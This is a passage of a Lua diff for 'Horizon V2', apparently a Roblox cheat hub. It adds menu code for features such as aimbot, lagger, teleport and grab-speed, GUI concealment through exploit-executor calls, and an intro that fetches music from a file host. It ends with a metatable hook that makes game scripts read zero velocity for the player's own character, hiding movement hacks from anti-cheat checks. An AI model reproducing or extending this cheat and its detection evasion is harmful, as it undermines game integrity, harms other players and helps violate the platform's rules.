+                    flashStatus("Config copied to clipboard!")
+                else
+                    loadInput.Text = code
+                    flashStatus("Clipboard unsupported — code placed in the box above, copy it manually.")
+                end
+            else
+                flashStatus("Failed to build config code.")
+            end
+        end)
+
+        loadBtn.MouseButton1Click:Connect(function()
+            local raw = loadInput.Text
+            if not raw or raw == "" then flashStatus("Paste a config code first."); return end
+            local ok, cfg = pcall(function() return __HH.decodeConfigCode(raw) end)
+            if ok and type(cfg) == "table" then
+                loadConfig(cfg)
+                applyState()
+                if __HH.mobileButtonsEnabled and buildMobileButtons then task.spawn(buildMobileButtons)
+                elseif destroyMobileButtons then destroyMobileButtons() end
+                if devLbl then devLbl.Text = __HH.selectedDevice or "PC" end
+                flashStatus("Config loaded successfully!")
+                -- Rebuild the whole panel so every textbox/toggle/keybind
+                -- (Normal Speed, Grab Speed, Lagger Speeds, AIM BOT Speed,
+                -- all switches, keybinds, sliders, etc.) actually shows the
+                -- real values that were just loaded, instead of leaving the
+                -- old numbers/labels frozen on screen until a manual rejoin.
+                task.delay(0.3, function()
+                    pcall(function()
+                        if __HH.mainFrame then __HH.mainFrame:Destroy() end
+                        buildGui()
+                        applyState()
+                        if __HH.mobileButtonsEnabled and buildMobileButtons then task.spawn(buildMobileButtons)
+                        elseif destroyMobileButtons then destroyMobileButtons() end
+                        if __HH.mainFrame then __HH.mainFrame.Visible = true end
+                    end)
+                end)
+            else
+                flashStatus("Invalid config code.")
+            end
+        end)
+
+        -- ─── Reset All Settings ─────────────────────────────────────────────
+        -- Wipes every saved toggle/speed/keybind/UI setting back to the
+        -- script's hardcoded defaults. Does NOT touch the selected device
+        -- (PC/Mobile/Controller) — that is what "Reset Device" is for.
+        local resetAllRow = mkRow(sfExtra)
+        mkLabel(resetAllRow, "Reset All Settings")
+        local resetAllBtn = Instance.new("TextButton", resetAllRow)
+        resetAllBtn.Size = UDim2.new(0,90,0,20); resetAllBtn.Position = UDim2.new(1,-95,0.5,-10)
+        resetAllBtn.BackgroundColor3 = Color3.fromRGB(255, 90, 90); resetAllBtn.BorderSizePixel = 0
+        resetAllBtn.Text = "Reset All"; resetAllBtn.TextColor3 = WHITE
+        resetAllBtn.Font = Enum.Font.GothamBold; resetAllBtn.TextSize = 10
+        resetAllBtn.AutoButtonColor = false; resetAllBtn.ZIndex = 5
+        Instance.new("UICorner", resetAllBtn).CornerRadius = UDim.new(0,5)
+        local resetAllStroke = Instance.new("UIStroke", resetAllBtn); resetAllStroke.Color = WHITE; resetAllStroke.Thickness = 1
+        wireResetAllButton(resetAllBtn, "Reset All", flashStatus)
+    end
+
+    -- ─── Mobile Tab ─────────────────────────────────────────────────────────
+    do
+        mkSect(sfMobile, "Button Visibility")
+        local mobBtnDefs = {
+            {key="drop",         label="DROP BR"},
+            {key="tpDown",       label="TP DOWN"},
+            {key="batV2",        label="AIM BOT"},
+            {key="tpLock",       label="TP BAT"},
+            {key="lagger",       label="LAGGER"},
+            {key="laggerCarry",  label="LAGGER CARRY"},
+            {key="carrySpeed",   label="CARRY SPD"},
+            {key="instaReset",   label="INSTA RESET"},
+            {key="autoLeft",     label="AUTO LEFT"},
+            {key="autoRight",    label="AUTO RIGHT"},
+        }
+        for _, def in ipairs(mobBtnDefs) do
+            local key = def.key
+            mkToggle(sfMobile, def.label, function(on)
+                __HH.buttonVisibility[key] = on
+                if __HH.mobileButtonsEnabled then buildMobileButtons() end
+                saveConfig()
+            end, __HH.buttonVisibility[key] ~= false)
+        end
+
+        -- ─── Mobile Settings ─────────────────────────────────────────────────
+        mkSect(sfMobile, "Mobile Settings")
+
+        local mobShowSet = mkToggle(sfMobile, "Show Mobile UI", function(on)
+            __HH.mobileButtonsEnabled = on
+            if on then buildMobileButtons() else destroyMobileButtons() end
+            if setMobVisual then setMobVisual(on) end
+            saveConfig()
+        end, __HH.mobileButtonsEnabled)
+
+        mkBoxRow(sfMobile, "Btn Size", __HH.mobileButtonsSize, function(v)
+            if v >= 10 and v <= 200 then
+                __HH.mobileButtonsSize = v
+                if __HH.mobileButtonsEnabled then buildMobileButtons() end
+                saveConfig()
+            end
+        end)
+
+        local mobDragSet = mkToggle(sfMobile, "Btn Drag Per Btn", function(on)
+            __HH.perButtonDragEnabled = on
+            if __HH.mobileButtonsEnabled then buildMobileButtons() end
+            saveConfig()
+        end, __HH.perButtonDragEnabled)
+
+        local mobLockSet = mkToggle(sfMobile, "Lock UI", function(on)
+            __HH.uiLocked = on
+            _G.YousefUiLocked = on
+            if setLockVisual then setLockVisual(on) end
+            saveConfig()
+        end, __HH.uiLocked)
+
+        do
+            local row = mkRow(sfMobile); mkLabel(row, "Reset Mobile Btns")
+            local resetBtn = Instance.new("TextButton", row)
+            resetBtn.Size = UDim2.new(0,60,0,20); resetBtn.Position = UDim2.new(1,-65,0.5,-10)
+            resetBtn.BackgroundColor3 = BTN_ACT; resetBtn.BorderSizePixel = 0
+            resetBtn.Text = "Reset"; resetBtn.TextColor3 = WHITE
+            resetBtn.Font = Enum.Font.GothamBold; resetBtn.TextSize = 9
+            resetBtn.AutoButtonColor = false; resetBtn.ZIndex = 5
+            Instance.new("UICorner", resetBtn).CornerRadius = UDim.new(0,5)
+            local rStroke = Instance.new("UIStroke", resetBtn); rStroke.Color = WHITE; rStroke.Thickness = 1
+            resetBtn.MouseButton1Click:Connect(function()
+                resetBtnPositions()
+                TS:Create(resetBtn, TweenInfo.new(0.1), {BackgroundColor3=WHITE}):Play()
+                task.delay(0.15, function()
+                    TS:Create(resetBtn, TweenInfo.new(0.1), {BackgroundColor3=BTN_ACT}):Play()
+                end)
+            end)
+        end
+
+        -- ─── Reset All Settings (Mobile tab copy) ──────────────────────────────
+        -- Same shared reset as the Extra tab's button — every toggle, speed,
+        -- keybind and mobile setting goes back to default. Kept here too so
+        -- it's reachable straight from the Mobile tab without switching tabs.
+        do
+            local mobResetAllRow = mkRow(sfMobile)
+            mkLabel(mobResetAllRow, "Reset All Settings")
+            local mobResetAllBtn = Instance.new("TextButton", mobResetAllRow)
+            mobResetAllBtn.Size = UDim2.new(0,90,0,20); mobResetAllBtn.Position = UDim2.new(1,-95,0.5,-10)
+            mobResetAllBtn.BackgroundColor3 = Color3.fromRGB(255, 90, 90); mobResetAllBtn.BorderSizePixel = 0
+            mobResetAllBtn.Text = "Reset All"; mobResetAllBtn.TextColor3 = WHITE
+            mobResetAllBtn.Font = Enum.Font.GothamBold; mobResetAllBtn.TextSize = 10
+            mobResetAllBtn.AutoButtonColor = false; mobResetAllBtn.ZIndex = 5
+            Instance.new("UICorner", mobResetAllBtn).CornerRadius = UDim.new(0,5)
+            local mobResetAllStroke = Instance.new("UIStroke", mobResetAllBtn); mobResetAllStroke.Color = WHITE; mobResetAllStroke.Thickness = 1
+
+            local mobResetStatusRow = mkRow(sfMobile)
+            local mobResetStatusLbl = Instance.new("TextLabel", mobResetStatusRow)
+            mobResetStatusLbl.Size = UDim2.new(1,0,1,0); mobResetStatusLbl.BackgroundTransparency = 1
+            mobResetStatusLbl.Text = ""; mobResetStatusLbl.TextColor3 = BTN_ACT
+            mobResetStatusLbl.Font = Enum.Font.GothamBold; mobResetStatusLbl.TextSize = 10
+            mobResetStatusLbl.TextXAlignment = Enum.TextXAlignment.Left; mobResetStatusLbl.ZIndex = 5
+            local function mobFlashStatus(msg)
+                mobResetStatusLbl.Text = msg
+                task.delay(3, function() if mobResetStatusLbl.Text == msg then mobResetStatusLbl.Text = "" end end)
+            end
+
+            wireResetAllButton(mobResetAllBtn, "Reset All", mobFlashStatus)
+        end
+
+        -- ─── Button Shapes ───────────────────────────────────────────────────
+        mkSect(sfMobile, "Button Shapes")
+
+        local mobCircleSet = mkToggle(sfMobile, "Circle Buttons", function(on)
+            __HH.circleButtonsEnabled = on
+            if on then
+                __HH.shapeButtonsEnabled = false
+                __HH.rectangularButtonsEnabled = false
+                if setShapeVisual then setShapeVisual(false) end
+                if setRectVisual then setRectVisual(false) end
+            end
+            if __HH.mobileButtonsEnabled then buildMobileButtons() end
+            saveConfig()
+        end, __HH.circleButtonsEnabled)
+
+        local mobShapeSet = mkToggle(sfMobile, "Shape Buttons", function(on)
+            __HH.shapeButtonsEnabled = on
+            if on then
+                __HH.circleButtonsEnabled = false
+                __HH.rectangularButtonsEnabled = false
+                if setCircleBtnsVisual then setCircleBtnsVisual(false) end
+                if setRectVisual then setRectVisual(false) end
+            end
+            if __HH.mobileButtonsEnabled then buildMobileButtons() end
+            saveConfig()
+        end, __HH.shapeButtonsEnabled)
+
+        local mobRectSet = mkToggle(sfMobile, "Rectangular Buttons", function(on)
+            __HH.rectangularButtonsEnabled = on
+            if on then
+                __HH.circleButtonsEnabled = false
+                __HH.shapeButtonsEnabled = false
+                if setCircleBtnsVisual then setCircleBtnsVisual(false) end
+                if setShapeVisual then setShapeVisual(false) end
+            end
+            if __HH.mobileButtonsEnabled then buildMobileButtons() end
+            saveConfig()
+        end, __HH.rectangularButtonsEnabled)
+
+    end
+
+    __HH.mainFrame.Visible = false
+    miniToggleBtn.Visible = false
+    print("[HORIZON V2] build v34 - intro ends ONLY when the full song finishes (truncated downloads re-fetched, no early close)")
+    print("Horizon V2 GUI Fully Loaded")
+end
+
+loadConfig()
+uiScaleValue = 0.6
+
+-- ============================================================
+-- DEVICE SELECTION (PC / MOBILE / CONTROLLER)
+-- ============================================================
+-- Shows a full-screen picker the first time the script ever runs (or again
+-- after "Reset Device" is pressed from the Extra tab). PC and Controller
+-- both hide the floating mobile buttons and rely on keybinds / gamepad
+-- buttons; Mobile shows the floating buttons normally.
+do
+    local DEV_ICE   = Color3.fromRGB(205, 232, 255)
+    local DEV_ACCENT= Color3.fromRGB(90, 195, 255)
+    local DEV_NAVY  = Color3.fromRGB(8, 38, 85)
+    local DEV_DARK  = Color3.fromRGB(10, 10, 14)
+
+    -- Small toast used for the "welcome to horizon v2!" message.
+    local function showWelcomeToast()
+        print("welcome to horizon v2!")
+        pcall(function()
+            local coreGui = game:GetService("CoreGui")
+            local playerGui = LP:WaitForChild("PlayerGui")
+            local old = coreGui:FindFirstChild("HorizonWelcomeToast") or playerGui:FindFirstChild("HorizonWelcomeToast")
+            if old then old:Destroy() end
+
+            local toastGui = Instance.new("ScreenGui")
+            toastGui.Name = "HorizonWelcomeToast"
+            toastGui.ResetOnSpawn = false
+            toastGui.IgnoreGuiInset = true
+            toastGui.DisplayOrder = 2147483646
+            if not pcall(function() toastGui.Parent = coreGui end) then
+                toastGui.Parent = playerGui
+            end
+
+            local card = Instance.new("Frame", toastGui)
+            card.AnchorPoint = Vector2.new(0.5, 0)
+            card.Position = UDim2.new(0.5, 0, 0, 24)
+            card.Size = UDim2.new(0, 280, 0, 44)
+            card.BackgroundColor3 = DEV_DARK
+            card.BackgroundTransparency = 0.05
+            card.BorderSizePixel = 0
+            Instance.new("UICorner", card).CornerRadius = UDim.new(0, 12)
+            local cardStroke = Instance.new("UIStroke", card)
+            cardStroke.Color = DEV_ACCENT; cardStroke.Thickness = 1.4; cardStroke.Transparency = 0.15
+
+            local lbl = Instance.new("TextLabel", card)
+            lbl.BackgroundTransparency = 1
+            lbl.Size = UDim2.new(1, -16, 1, 0)
+            lbl.Position = UDim2.new(0, 8, 0, 0)
+            lbl.Text = "welcome to horizon v2!"
+            lbl.Font = Enum.Font.GothamBlack
+            lbl.TextSize = 15
+            lbl.TextColor3 = DEV_ICE
+            lbl.TextXAlignment = Enum.TextXAlignment.Center
+
+            card.BackgroundTransparency = 1
+            cardStroke.Transparency = 1
+            lbl.TextTransparency = 1
+            local TSvc = game:GetService("TweenService")
+            TSvc:Create(card, TweenInfo.new(0.25), {BackgroundTransparency = 0.05}):Play()
+            TSvc:Create(cardStroke, TweenInfo.new(0.25), {Transparency = 0.15}):Play()
+            TSvc:Create(lbl, TweenInfo.new(0.25), {TextTransparency = 0}):Play()
+            task.delay(2.6, function()
+                if not toastGui.Parent then return end
+                TSvc:Create(card, TweenInfo.new(0.3), {BackgroundTransparency = 1}):Play()
+                TSvc:Create(cardStroke, TweenInfo.new(0.3), {Transparency = 1}):Play()
+                TSvc:Create(lbl, TweenInfo.new(0.3), {TextTransparency = 1}):Play()
+                task.delay(0.35, function() pcall(function() toastGui:Destroy() end) end)
+            end)
+        end)
+    end
+    __HH.showWelcomeToast = showWelcomeToast
+
+    -- Same picker structure/behaviour as the original source (backdrop +
+    -- centered card + row of mode buttons, MouseButton1Click sets the
+    -- selection and destroys the GUI, then a blocking wait returns the
+    -- result) — only the name, the color scheme (light blue instead of
+    -- white/black) and a third "CONTROLLER" button were added/changed.
+    local function choosePlatformMode()
+        local pickerGui = Instance.new("ScreenGui")
+        pickerGui.Name = "HorizonDevicePicker"
+        pickerGui.ResetOnSpawn = false
+        pickerGui.IgnoreGuiInset = true
+        pickerGui.DisplayOrder = 9998 -- stays below the intro and appears after it disappears
+        pickerGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+        pcall(function() if syn and syn.protect_gui then syn.protect_gui(pickerGui) end end)
+        if not pcall(function() pickerGui.Parent = game:GetService("CoreGui") end) then
+            pickerGui.Parent = LP:WaitForChild("PlayerGui")
+        end
+
+        local backdrop = Instance.new("Frame", pickerGui)
+        backdrop.Size = UDim2.fromScale(1, 1)
+        backdrop.BackgroundColor3 = DEV_ICE
+        backdrop.BorderSizePixel = 0
+        backdrop.ZIndex = 1
+
+        local card = Instance.new("Frame", backdrop)
+        card.AnchorPoint = Vector2.new(0.5, 0.5)
+        card.Position = UDim2.fromScale(0.5, 0.5)
+        card.Size = UDim2.fromOffset(460, 220)
+        card.BackgroundColor3 = DEV_ICE
+        card.BorderSizePixel = 0
+        card.ZIndex = 2
+        Instance.new("UICorner", card).CornerRadius = UDim.new(0, 16)
+        local cardStroke = Instance.new("UIStroke", card)
+        cardStroke.Color = DEV_NAVY
+        cardStroke.Thickness = 2
+
+        local title = Instance.new("TextLabel", card)
+        title.Size = UDim2.new(1, -30, 0, 42)
+        title.Position = UDim2.fromOffset(15, 18)
+        title.BackgroundTransparency = 1
+        title.Text = "SELECT YOUR DEVICE"
+        title.TextColor3 = DEV_NAVY
+        title.Font = Enum.Font.PermanentMarker
+        title.TextSize = 22
+        title.ZIndex = 3
+
+        local hint = Instance.new("TextLabel", card)
+        hint.Size = UDim2.new(1, -30, 0, 24)
+        hint.Position = UDim2.fromOffset(15, 58)
+        hint.BackgroundTransparency = 1
+        hint.Text = "Choose the interface mode"
+        hint.TextColor3 = DEV_NAVY
+        hint.Font = Enum.Font.Gotham
+        hint.TextSize = 12
+        hint.ZIndex = 3
+
+        local selected = nil
+        local function makeButton(label, x, device)
+            local button = Instance.new("TextButton", card)
+            button.Size = UDim2.fromOffset(130, 62)
+            button.Position = UDim2.fromOffset(x, 112)
+            button.BackgroundColor3 = DEV_ACCENT
+            button.BorderSizePixel = 0
+            button.AutoButtonColor = false
+            button.Text = label
+            button.TextColor3 = DEV_ICE
+            button.Font = Enum.Font.GothamBold
+            button.TextSize = 18
+            button.ZIndex = 3
+            Instance.new("UICorner", button).CornerRadius = UDim.new(0, 10)
+            local stroke = Instance.new("UIStroke", button)
+            stroke.Color = DEV_NAVY
+            stroke.Thickness = 1
+            button.MouseButton1Click:Connect(function()
+                selected = device
+                pickerGui:Destroy()
+            end)
+            return button
+        end
+
+        makeButton("PC", 20, "PC")
+        makeButton("MOBILE", 165, "MOBILE")
+        makeButton("CONTROLLER", 310, "CONTROLLER")
+
+        while pickerGui.Parent and not selected do
+            task.wait()
+        end
+        return selected or "PC"
+    end
+    __HH.choosePlatformMode = choosePlatformMode
+
+    -- Runs the picker (if needed) and applies the resulting device choice.
+    -- force = true always re-shows the picker (used by "Reset Device").
+    __HH.runDeviceSelection = function(force)
+        if force or not __HH.selectedDevice then
+            local device = choosePlatformMode()
+            __HH.selectedDevice = device
+            __HH.mobileButtonsEnabled = (device == "MOBILE")
+            saveConfig()
+            if __HH.mobGuiRef then
+                if __HH.mobileButtonsEnabled and buildMobileButtons then
+                    task.spawn(buildMobileButtons)
+                elseif destroyMobileButtons then
+                    destroyMobileButtons()
+                end
+            end
+            if setMobVisual then pcall(setMobVisual, __HH.mobileButtonsEnabled) end
+            showWelcomeToast()
+        end
+    end
+end
+
+local function _runIntro(onComplete)
+    local TSx        = game:GetService("TweenService")
+    local SoundService = game:GetService("SoundService")
+    local coreGui    = game:GetService("CoreGui")
+    local playerGui  = LP:WaitForChild("PlayerGui")
+
+    -- music: the Monster intro song only (no images / beat effects)
+    local MUSIC_URL  = "https://files.catbox.moe/qhpfe5.mp3"
+    local MUSIC_FILE = "horizon_intro_monster.mp3"
+    local MUSIC_VOL  = 0.75
+
+    local introFinished = false
+    local introSound    = nil
+
+    -- clean old intro GUIs from previous versions
+    pcall(function()
+        for _, name in ipairs({"MonsterIntro","HorizonDuelsIntro","HorizonHubIntroV6","HorizonHubSpriteIntro","HorizonHubVideoIntro","HorizonHubIntro","PureHubSpriteIntro","PureHubVideoIntro","PureHubIntro","PureHubIntroV6"}) do
+            local a = coreGui:FindFirstChild(name)
+            if a then a:Destroy() end
+            local b = playerGui:FindFirstChild(name)
+            if b then b:Destroy() end
+        end
+    end)
+
+    local gui = Instance.new("ScreenGui")
+    gui.Name           = "HorizonDuelsIntro"
+    gui.ResetOnSpawn   = false
+    gui.IgnoreGuiInset = true
+    gui.DisplayOrder   = 2147483647
+    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    pcall(function() if syn and syn.protect_gui then syn.protect_gui(gui) end end)
+    if not pcall(function() gui.Parent = coreGui end) then
+        gui.Parent = playerGui
+    end
+
+    local bg = Instance.new("Frame", gui)
+    bg.Size                  = UDim2.new(1, 0, 1, 0)
+    bg.BackgroundColor3      = Color3.new(0, 0, 0)
+    bg.BackgroundTransparency = 1
+    bg.BorderSizePixel       = 0
+    bg.ZIndex                = 1
+
+    -- ===== title group: "horizon duels" + "v2" side by side, shakes as one =====
+    -- everything lives inside this holder so the whole text shakes together
+    local holder = Instance.new("Frame", gui)
+    holder.Name                  = "TitleHolder"
+    holder.Size                  = UDim2.new(1, 0, 1, 0)
+    holder.Position              = UDim2.new(0, 0, 0, 0)
+    holder.BackgroundTransparency = 1
+    holder.BorderSizePixel       = 0
+    holder.ZIndex                = 5
+
+    -- auto-sized horizontal row keeps the pair perfectly centered
+    local row = Instance.new("Frame", holder)
+    row.Name                  = "TitleRow"
+    row.AnchorPoint           = Vector2.new(0.5, 0.5)
+    row.Position              = UDim2.new(0.5, 0, 0.5, -8)
+    row.Size                  = UDim2.new(0, 0, 0, 64)
+    row.AutomaticSize         = Enum.AutomaticSize.X
+    row.BackgroundTransparency = 1
+    row.BorderSizePixel       = 0
+    row.ClipsDescendants      = false
+    row.ZIndex                = 5
+
+    local rowLayout = Instance.new("UIListLayout", row)
+    rowLayout.FillDirection      = Enum.FillDirection.Horizontal
+    rowLayout.VerticalAlignment  = Enum.VerticalAlignment.Center
+    rowLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+    rowLayout.SortOrder          = Enum.SortOrder.LayoutOrder
+    rowLayout.Padding            = UDim.new(0, 12)
+
+    -- main title (very light blue)
+    local title = Instance.new("TextLabel", row)
+    title.LayoutOrder           = 1
+    title.Size                  = UDim2.new(0, 0, 0, 64)
+    title.AutomaticSize         = Enum.AutomaticSize.X
+    title.BackgroundTransparency = 1
+    title.Text                  = "horizon duels"
+    title.TextColor3            = Color3.fromRGB(205, 242, 255)
+    title.Font                  = Enum.Font.GothamBlack
+    title.TextSize              = 46
+    title.TextTransparency      = 1
+    title.ZIndex                = 5
+    local titleStroke = Instance.new("UIStroke", title)
+    titleStroke.Color       = Color3.fromRGB(120, 210, 255)
+    titleStroke.Thickness   = 2
+    titleStroke.Transparency = 0.45
+
+    -- slot that reserves the space for "v2" so the drop animation can't
+    -- shift the title around while it falls
+    local v2Slot = Instance.new("Frame", row)
+    v2Slot.Name                  = "V2Slot"
+    v2Slot.LayoutOrder           = 2
+    v2Slot.Size                  = UDim2.new(0, 62, 0, 64)
+    v2Slot.BackgroundTransparency = 1
+    v2Slot.BorderSizePixel       = 0
+    v2Slot.ClipsDescendants      = false
+    v2Slot.ZIndex                = 5
+
+    -- "v2" — same font as the title, falls in from above
+    local v2 = Instance.new("TextLabel", v2Slot)
+    v2.Name                  = "V2Tag"
+    v2.AnchorPoint           = Vector2.new(0.5, 0.5)
+    v2.Size                  = UDim2.new(1, 0, 0, 58)
+    v2.BackgroundTransparency = 1
+    v2.Text                  = "v2"
+    v2.TextColor3            = Color3.fromRGB(205, 242, 255)
+    v2.Font                  = Enum.Font.GothamBlack   -- same font as the title
+    v2.TextSize              = 46                      -- same size as the title
+    v2.TextTransparency      = 1
+    v2.ZIndex                = 6
+    local v2Stroke = Instance.new("UIStroke", v2)
+    v2Stroke.Color        = Color3.fromRGB(120, 210, 255)
+    v2Stroke.Thickness    = 2
+    v2Stroke.Transparency = 0.45
+
+    local V2_HOME  = UDim2.new(0.5, 0, 0.5, 0)      -- final spot next to the title
+    local V2_START = UDim2.new(0.5, 0, 0.5, -520)   -- way above the screen
+    v2.Position = V2_START
+
+    -- light blue underline under the text
+    local underline = Instance.new("Frame", holder)
+    underline.AnchorPoint            = Vector2.new(0.5, 0.5)
+    underline.Position               = UDim2.new(0.5, 0, 0.5, 34)
+    underline.Size                   = UDim2.new(0, 260, 0, 3)
+    underline.BackgroundColor3       = Color3.fromRGB(165, 226, 255)
+    underline.BackgroundTransparency = 1
+    underline.BorderSizePixel        = 0
+    underline.ZIndex                 = 5
+    local ulGlow = Instance.new("UIStroke", underline)
+    ulGlow.Color       = Color3.fromRGB(140, 215, 255)
+    ulGlow.Transparency = 0.35
+    ulGlow.Thickness   = 3
+
+    -- SKIP INTRO button (Monster style)
+    local skip = Instance.new("TextButton", gui)
+    skip.AnchorPoint            = Vector2.new(1, 0)
+    skip.Position               = UDim2.new(1, -14, 0, 14)
+    skip.Size                   = UDim2.fromOffset(105, 36)
+    skip.BackgroundColor3       = Color3.fromRGB(15, 60, 130)
+    skip.BackgroundTransparency = 0.15
+    skip.BorderSizePixel        = 0
+    skip.Text                   = "SKIP INTRO"
+    skip.TextColor3             = Color3.fromRGB(175, 225, 255)
+    skip.TextSize               = 12
+    skip.Font                   = Enum.Font.GothamBold
+    skip.AutoButtonColor        = false
+    skip.ZIndex                 = 500
+    Instance.new("UICorner", skip).CornerRadius = UDim.new(0, 7)
+    local skipStroke = Instance.new("UIStroke", skip)
+    skipStroke.Color       = Color3.fromRGB(60, 140, 255)
+    skipStroke.Transparency = 0.55
+    skipStroke.Thickness   = 1
+
+    local function finishIntro()
+        if introFinished then return end
+        introFinished = true
+        -- The song is NOT cut: it keeps playing until it ends on its own.
+        pcall(function() gui:Destroy() end)
+        onComplete()
+    end
+
+    skip.MouseButton1Click:Connect(finishIntro)
+    skip.MouseEnter:Connect(function()
+        TSx:Create(skip, TweenInfo.new(0.12), {BackgroundColor3 = Color3.fromRGB(25, 90, 180)}):Play()
+    end)
+    skip.MouseLeave:Connect(function()
+        TSx:Create(skip, TweenInfo.new(0.12), {BackgroundColor3 = Color3.fromRGB(15, 60, 130)}):Play()
+    end)
+
+    -- fade the title + underline in
+    TSx:Create(title, TweenInfo.new(0.6), {TextTransparency = 0}):Play()
+    TSx:Create(underline, TweenInfo.new(0.6), {BackgroundTransparency = 0}):Play()
+
+    -- "v2" drops in from above next to the title, and the MOMENT it lands the
+    -- whole text (title + v2 + underline) shakes like an earthquake until the
+    -- intro finishes.
+    task.spawn(function()
+        task.wait(0.55)
+        if introFinished or not v2.Parent then return end
+
+        TSx:Create(v2, TweenInfo.new(0.25), {TextTransparency = 0}):Play()
+        local drop = TSx:Create(
+            v2,
+            TweenInfo.new(0.75, Enum.EasingStyle.Quart, Enum.EasingDirection.In),
+            {Position = V2_HOME}
+        )
+        drop:Play()
+        drop.Completed:Wait()
+        if introFinished or not holder.Parent then return end
+
+        -- impact: hard slam then continuous quake on the whole group
+        local rnd = Random.new()
+        local t0  = tick()
+        while not introFinished and holder.Parent do
+            local age = tick() - t0
+            -- big jolt on landing, settles into a steady tremble
+            local power = (age < 0.35) and 22 or 9
+            local rot   = (age < 0.35) and 5 or 2.2
+            holder.Position = UDim2.new(
+                0, rnd:NextNumber(-power, power),
+                0, rnd:NextNumber(-power * 0.7, power * 0.7)
+            )
+            holder.Rotation = rnd:NextNumber(-rot, rot)
+            task.wait(0.025)
+        end
+        pcall(function()
+            holder.Position = UDim2.new(0, 0, 0, 0)
+            holder.Rotation = 0
+        end)
+    end)
+
+    -- music loader (bulletproof + truncated-download protection)
+    -- The real song (qhpfe5.mp3) is 294802 bytes / ~12.28s at 192kbps.
+    -- Anything shorter than that is a truncated download and must be
+    -- re-downloaded, otherwise the song "cuts off" mid-play.
+    local EXPECTED_SIZE = 294802
+    local MIN_SIZE      = 280000
+    local EARLY_END_MAX = 9.5      -- loaded length below this = truncated file
+    local downloadTries = 0
+
+    local function clearBadCache()
+        pcall(function()
+            if not (isfile and isfile(MUSIC_FILE)) then return end
+            local bad = true
+            pcall(function()
+                local d = readfile and readfile(MUSIC_FILE)
+                if type(d) == "string" and #d >= MIN_SIZE then bad = false end
+            end)
+            if bad and delfile then delfile(MUSIC_FILE) end
+        end)
+    end
+
+    local function tryDownload()
+        local body
+        pcall(function()
+            local d = game:HttpGet(MUSIC_URL, true)
+            if type(d) == "string" and #d >= MIN_SIZE then body = d end
+        end)
+        if not body then
+            pcall(function()
+                local d = game:HttpGet(MUSIC_URL)
+                if type(d) == "string" and #d >= MIN_SIZE then body = d end
+            end)
+        end
+        if not body then
+            local _req = syn and syn.request or request or http_request
+            if _req then
+                local okR, r = pcall(_req, {Url = MUSIC_URL, Method = "GET"})
+                if okR and r then
+                    local b = r.Body or r.body
+                    if type(b) == "string" and #b >= MIN_SIZE then body = b end
+                end
+            end
+        end
+        if body and writefile then
+            pcall(function() writefile(MUSIC_FILE, body) end)
+        end
+        return body
+    end
+
+    local function loadAsset()
+        clearBadCache()
+        local asset
+        pcall(function()
+            if isfile and isfile(MUSIC_FILE) and getcustomasset then
+                asset = getcustomasset(MUSIC_FILE)
+            end
+        end)
+        return asset
+    end
+
+    task.spawn(function()
+        if introFinished then return end
+        local asset = loadAsset()
+        while not asset and downloadTries < 3 and not introFinished do
+            downloadTries = downloadTries + 1
+            tryDownload()
+            asset = loadAsset()
+            if not asset then task.wait(1) end
+        end
+        if introFinished then return end
+        if not asset then
+            -- song unavailable at all: don't trap the player forever
+            task.delay(6, finishIntro)
+            return
+        end
+
+        local plays = 0
+        local function startSong()
+            if introFinished then return end
+            -- remove any older instance still playing (script re-exec)
+            pcall(function()
+                local old = SoundService:FindFirstChild("HorizonIntroMusic")
+                if old then old:Destroy() end
+            end)
+            introSound = Instance.new("Sound")
+            introSound.Name     = "HorizonIntroMusic"
+            introSound.SoundId  = asset
+            introSound.Volume   = MUSIC_VOL
+            introSound.Looped   = false
+            introSound.Parent   = SoundService
+            -- The intro ONLY ends when the FULL song really finishes.
+            introSound.Ended:Connect(function()
+                local endedEarly = false
+                pcall(function()
+                    local tl = introSound and introSound.TimeLength or 0
+                    if tl > 0 and tl < EARLY_END_MAX then endedEarly = true end
+                end)
+                local s = introSound
+                if endedEarly and plays < 2 and not introFinished then
+                    -- truncated playback: refresh the file and replay it
+                    plays = plays + 1
+                    pcall(function() if s then s:Destroy() end end)
+                    introSound = nil
+                    clearBadCache()
+                    tryDownload()
+                    local newAsset = loadAsset()
+                    if newAsset then asset = newAsset end
+                    task.delay(0.4, startSong)
+                    return
+                end
+                pcall(function() if s then s:Destroy() end end)
+                if introSound == s then introSound = nil end
+                finishIntro()
+            end)
+            pcall(function() introSound:Play() end)
+        end
+        startSong()
+    end)
+end
+
+-- Ask the player which device they're on before anything else shows up.
+-- Runs once ever (persisted in VynxPC.json); "Reset Device" in the Extra
+-- tab re-triggers this with force=true.
+if __HH.runDeviceSelection then __HH.runDeviceSelection(false) end
+
+_runIntro(function()
+    buildGui()
+    _G.HorizonHubIntroFinished = true
+    -- The grab progress HUD only appears after the intro finishes.
+    pcall(function()
+        local stealGui = game:GetService("CoreGui"):FindFirstChild("StealBarGui")
+            or LP:WaitForChild("PlayerGui"):FindFirstChild("StealBarGui")
+        if stealGui then stealGui.Enabled = true end
+    end)
+    if __HH.mainFrame then __HH.mainFrame.Visible = true end
+    if __HH.mobileButtonsEnabled then task.spawn(buildMobileButtons) end
+    applyState()
+    task.spawn(function()
+        for _, plr in ipairs(Players:GetPlayers()) do
+            if plr ~= LP then
+                task.spawn(function()
+                    if plr.Character then createPlayerSpeedLabel(plr)
+                    else plr.CharacterAdded:Wait(); createPlayerSpeedLabel(plr) end
+                end)
+            end
+        end
+    end)
+    print("Horizon V2 Fully Loaded")
+end)
+
+end
+
+task.spawn(function()
+	local _rs = game:GetService("RunService")
+	local _p = game:GetService("Players")
+	local _lp = _p.LocalPlayer
+
+	local _s = 59
+	local _a = false
+	local _v = Vector3.zero
+
+	local _mt = getrawmetatable(game)
+	setreadonly(_mt, false)
+
+	local _oi = _mt.__index
+	local _on = _mt.__newindex
+
+	_mt.__index = newcclosure(function(t, k)
+		if not checkcaller() then
+			local _tk = tostring(k)
+			if _tk == "AssemblyLinearVelocity" or _tk == "Velocity" then
+				if typeof(t) == "Instance" and t:IsA("BasePart") then
+					local _tn = t.Name
+					if _tn == "HumanoidRootPart" or _tn == "Torso" or _tn == "UpperTorso" then
+						if t:IsDescendantOf(_lp.Character) then
+							return _v
+						end
+					end
+				end
 			end
-
-			task.wait(5)
 		end
-	elseif game.PlaceId == 109983668079237 then
-		sliced86("connecting")
-		local ok, result = pcall(slicedfn29)
+		return _oi(t, k)
+	end)
 
-		if ok then
